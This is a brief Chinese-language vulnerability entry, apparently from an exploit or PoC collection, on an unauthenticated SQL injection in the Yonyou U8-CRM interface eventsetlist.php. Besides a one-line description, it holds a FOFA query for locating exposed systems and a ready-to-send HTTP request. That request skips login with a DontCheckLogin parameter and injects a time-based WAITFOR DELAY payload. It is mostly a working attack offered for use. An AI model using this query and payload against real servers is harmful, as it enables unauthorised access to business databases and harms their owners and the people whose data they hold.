# 用友U8-CRM系统接口eventseteventsetlist.php存在SQL注入

用友U8-CRM系统接口eventseteventsetlist.php存在SQL注入，未经身份验证的攻击者通过漏洞执行任意SQL语句。

## fofa

```javascript
body="用友U8CRM" || body="/js/tfunction.js" || title="用友U8CRM"
```

## poc

```javascript
GET /eventset/eventsetlist.php?DontCheckLogin=1&action=stop&stopFlag=1&eventID=1;WAITFOR+DELAY+'0:0:5'-- HTTP/1.1
Host: 
Cookie: PHPSESSID=bgsesstimeout-;
```
